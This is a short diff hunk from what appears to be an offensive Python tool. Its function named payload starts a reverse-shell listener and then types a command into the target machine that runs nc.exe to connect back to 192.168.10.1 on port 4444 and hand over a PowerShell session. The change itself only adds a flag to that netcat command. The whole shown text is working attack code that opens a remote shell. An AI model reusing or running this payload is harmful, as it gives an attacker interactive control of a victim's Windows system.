@@ -90,7 +90,7 @@ def payload(web_dir):
 
 	shelllistener=Process(target=reverse_shell_listener)
 	shelllistener.start()
-	eco.type("./nc.exe 192.168.10.1 4444 -D -U -w 5 -vv -e powershell")
+	eco.type("./nc.exe 192.168.10.1 4444 -D -U -w 5 -n -vv -e powershell")
 	eco.press("ENTER")
 	print("Waiting for shell to exit")
 	shelllistener.join()
